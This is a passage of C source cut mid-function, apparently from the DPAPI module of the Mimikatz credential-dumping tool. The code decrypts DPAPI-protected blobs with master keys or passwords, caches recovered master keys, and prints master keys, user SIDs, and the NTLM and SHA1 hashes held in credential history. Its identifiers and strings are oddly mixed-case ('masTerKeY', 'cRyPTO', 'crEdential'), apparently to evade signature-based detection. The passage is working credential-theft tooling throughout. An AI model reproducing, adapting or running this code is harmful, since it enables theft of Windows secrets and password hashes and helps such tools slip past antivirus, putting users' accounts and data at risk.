	DWORD masTerKeYLen = 0, entropyLen = 0, flags = 0;
	PKULL_M_DPAPI_BLOB blob;
	PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry = NULL;
	BOOL isNormalAPI = kull_m_string_args_byName(argc, argv, L"unprotect", NULL, NULL);

	if(kull_m_string_args_byName(argc, argv, L"masTerKeY", &szMasterkey, NULL))
		kull_m_string_stringToHexBuffer(szMasterkey, &masTerKeY, &masTerKeYLen);
	kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &entropy, &entropyLen);
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;

	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;

	if(blob = kull_m_dPApi_blob_create(pDataIn))
	{
		entry = kuhl_m_dPApi_oe_masTerKeY_get(&blob->guidMasterKey);
		if(entry || (masTerKeY && masTerKeYLen) || isNormalAPI)
		{
			if(pText)
				kprintf(L"%s", pText);

			if(isNormalAPI)
			{
				kprintf(L" * using CryptUnprotectData API\n");
			}
			
			if(entry)
			{
				kprintf(L" * volatile caCHe: ");
				kuhl_m_dPApi_oe_masTerKeY_descr(entry);
			}
			if(masTerKeY)
			{
				kprintf(L" * masTerKeY     : ");
				kull_m_string_wprintf_hex(masTerKeY, masTerKeYLen, 0);
				kprintf(L"\n");
			}
			if(pPrompt)
			{
				kprintf(L" > prompt flags  : ");
				kull_m_dPApi_displayPromptFlags(pPrompt->dwPromptFlags);
				kprintf(L"\n");
			}
			else flags |= CRYPTPROTECT_UI_FORBIDDEN;
			if(entropy)
			{
				kprintf(L" > entropy       : ");
				kull_m_string_wprintf_hex(entropy, entropyLen, 0);
				kprintf(L"\n");
			}
			if(szPassword)
				kprintf(L" > password      : %s\n", szPassword);

			if(entry)
				status = kull_m_dPApi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, NULL, 0, pDataOut, dwDataOutLen, entry->data.keyHash, sizeof(entry->data.keyHash), szPassword);

			if(!status && ((masTerKeY && masTerKeYLen) || isNormalAPI))
			{
				status = kull_m_dPApi_unprotect_raw_or_blob(pDataIn, dwDataInLen, ppszDataDescr, (pOptionalEntropy && dwOptionalEntropyLen) ? pOptionalEntropy : entropy, (pOptionalEntropy && dwOptionalEntropyLen) ? dwOptionalEntropyLen : entropyLen, pPrompt, flags, pDataOut, dwDataOutLen, masTerKeY, masTerKeYLen, szPassword);
				if(status && masTerKeY && masTerKeYLen)
					kuhl_m_dPApi_oe_masTerKeY_add(&blob->guidMasterKey, masTerKeY, masTerKeYLen);

				if(!status && !masTerKeY)
				{
					if(GetLastError() == NTE_BAD_KEY_STATE)
					{
						PRINT_ERROR(L"NTE_BAD_KEY_STATE, needed Masterkey is: ");
						kull_m_string_displayGUID(&blob->guidMasterKey);
						kprintf(L"\n");
					}
					else PRINT_ERROR_AUTO(L"CryptUnprotectData");
				}
			}
			//kprintf(L"\n");
		}
		kull_m_dPApi_blob_delete(blob);
	}

	if(entropy)
		LocalFree(entropy);
	if(masTerKeY)
		LocalFree(masTerKeY);
	return status;
}

void kuhl_m_dPApi_display_MasterkeyInfosAndFree(LPCGUID guid, PVOID data, DWORD dataLen, PSID sid)
{
	BYTE digest[SHA_DIGEST_LENGTH];
	
	kprintf(L"  key : ");
	kull_m_string_wprintf_hex(data, dataLen, 0);
	kprintf(L"\n");
	if(guid)
		kuhl_m_dPApi_oe_masTerKeY_add(guid, data, dataLen);
	if(kull_m_cRyPTO_hash(CALG_SHA1, data, dataLen, digest, sizeof(digest)))
	{
		kprintf(L"  sha1: ");
		kull_m_string_wprintf_hex(digest, sizeof(digest), 0);
		kprintf(L"\n");
	}
	LocalFree(data);
	if(sid)
	{
		kprintf(L"  sid : ");
		kull_m_string_displaySID(sid);
		kprintf(L"\n");
		LocalFree(sid);
	}
}

void kuhl_m_dPApi_display_CredHist(PKULL_M_DPAPI_CREDHIST_ENTRY entry, LPCVOID ntlm, LPCVOID sha1)
{
	PWSTR currentStringSid;
	kprintf(L"   "); kull_m_string_displaySID(entry->pSid); kprintf(L" -- "); kull_m_string_displayGUID(&entry->header.guid); kprintf(L"\n");
	kprintf(L"   > NTLM: "); kull_m_string_wprintf_hex(ntlm, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
	kprintf(L"   > SHA1: "); kull_m_string_wprintf_hex(sha1, SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
	if(ConvertSidToStringSid(entry->pSid, &currentStringSid))
	{
		kuhl_m_dPApi_oe_crEdential_add(currentStringSid, &entry->header.guid, ntlm, sha1, NULL, NULL);
		LocalFree(currentStringSid);
	}
}